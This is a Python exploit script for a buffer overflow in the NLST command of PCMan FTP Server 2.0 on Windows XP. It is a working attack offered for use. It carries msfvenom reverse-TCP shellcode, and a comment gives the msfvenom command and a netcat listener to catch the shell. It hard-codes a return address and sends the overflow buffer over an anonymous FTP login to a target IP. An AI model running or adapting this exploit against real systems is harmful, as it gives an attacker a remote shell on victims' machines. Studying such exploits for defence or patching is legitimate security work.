#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket


#Exploit Title: PCMan FTP Server 2.0 Buffer Overflow NLST command
#Date: 03/11/16
#Exploit Author: Karri93
#Version: 2.0
#Tested on: Windows XP Profesional SP3 Spanish x86 
#CVE: N/A


#Shellcode Metasploit:
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 -b '\x00\x0A\x0D' -f -c 
#nc -lvp 443


ret= "\x2F\x1D\xF1\x77" #GDI32.dll

shellcode=("\xd9\xc4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x52\xba\x9b\x84\x71"
"\xb0\x83\xc3\x04\x31\x53\x13\x03\xc8\x97\x93\x45\x12\x7f\xd1"
"\xa6\xea\x80\xb6\x2f\x0f\xb1\xf6\x54\x44\xe2\xc6\x1f\x08\x0f"
"\xac\x72\xb8\x84\xc0\x5a\xcf\x2d\x6e\xbd\xfe\xae\xc3\xfd\x61"
"\x2d\x1e\xd2\x41\x0c\xd1\x27\x80\x49\x0c\xc5\xd0\x02\x5a\x78"
"\xc4\x27\x16\x41\x6f\x7b\xb6\xc1\x8c\xcc\xb9\xe0\x03\x46\xe0"
"\x22\xa2\x8b\x98\x6a\xbc\xc8\xa5\x25\x37\x3a\x51\xb4\x91\x72"
"\x9a\x1b\xdc\xba\x69\x65\x19\x7c\x92\x10\x53\x7e\x2f\x23\xa0"
"\xfc\xeb\xa6\x32\xa6\x78\x10\x9e\x56\xac\xc7\x55\x54\x19\x83"
"\x31\x79\x9c\x40\x4a\x85\x15\x67\x9c\x0f\x6d\x4c\x38\x4b\x35"
"\xed\x19\x31\x98\x12\x79\x9a\x45\xb7\xf2\x37\x91\xca\x59\x50"
"\x56\xe7\x61\xa0\xf0\x70\x12\x92\x5f\x2b\xbc\x9e\x28\xf5\x3b"
"\xe0\x02\x41\xd3\x1f\xad\xb2\xfa\xdb\xf9\xe2\x94\xca\x81\x68"
"\x64\xf2\x57\x3e\x34\x5c\x08\xff\xe4\x1c\xf8\x97\xee\x92\x27"
"\x87\x11\x79\x40\x22\xe8\xea\xaf\x1b\xf3\xed\x47\x5e\xf3\xf0"
"\x2c\xd7\x15\x98\x42\xbe\x8e\x35\xfa\x9b\x44\xa7\x03\x36\x21"
"\xe7\x88\xb5\xd6\xa6\x78\xb3\xc4\x5f\x89\x8e\xb6\xf6\x96\x24"
"\xde\x95\x05\xa3\x1e\xd3\x35\x7c\x49\xb4\x88\x75\x1f\x28\xb2"
"\x2f\x3d\xb1\x22\x17\x85\x6e\x97\x96\x04\xe2\xa3\xbc\x16\x3a"
"\x2b\xf9\x42\x92\x7a\x57\x3c\x54\xd5\x19\x96\x0e\x8a\xf3\x7e"
"\xd6\xe0\xc3\xf8\xd7\x2c\xb2\xe4\x66\x99\x83\x1b\x46\x4d\x04"
"\x64\xba\xed\xeb\xbf\x7e\x1d\xa6\x9d\xd7\xb6\x6f\x74\x6a\xdb"
"\x8f\xa3\xa9\xe2\x13\x41\x52\x11\x0b\x20\x57\x5d\x8b\xd9\x25"
"\xce\x7e\xdd\x9a\xef\xaa")

buffer= '\x90'*30 + shellcode
buffer1= '\x41' * 2007 + ret + buffer + '\x43'*(696-len(buffer)) 
print "Sending..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.1.43',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS \r\n')
s.recv(1024)
s.send('NLST' + buffer1 + '\r\n')
s.close()